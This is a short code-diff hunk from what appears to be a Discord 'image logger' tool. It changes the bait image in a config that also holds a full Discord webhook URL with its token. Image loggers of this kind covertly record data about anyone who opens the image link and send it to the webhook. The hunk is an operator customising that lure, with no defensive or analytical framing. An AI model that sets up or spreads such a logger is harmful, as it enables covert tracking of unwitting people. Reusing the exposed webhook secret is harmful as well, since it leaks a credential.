@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1344704980631945277/qimjTc2h2qUJdo3fVDuzrfXcfbi2J7_Rca5DH85b2bB2S_UB6Ae6ZokEXUxrDBd9JH9U",
-    "image": "https://c.tenor.com/BP79uBTrSy0AAAAd/tenor.gif", # You can also have a custom image by using a URL argument
+    "image": "https://www.farming-simulator.com/cms/uploads/news_679787b18719c.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
